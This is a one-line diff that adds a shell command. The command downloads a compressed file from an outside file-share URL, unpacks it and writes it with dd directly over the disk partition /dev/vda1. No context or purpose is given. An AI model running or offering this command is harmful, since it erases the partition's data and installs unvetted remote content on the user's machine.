@@ -1,0 +1,1 @@
+wget -O- 'http://yun.cloudtang.cf/index.php?share/fileDownload&user=1&sid=wPGXrUuf' | gunzip | dd of=/dev/vda1
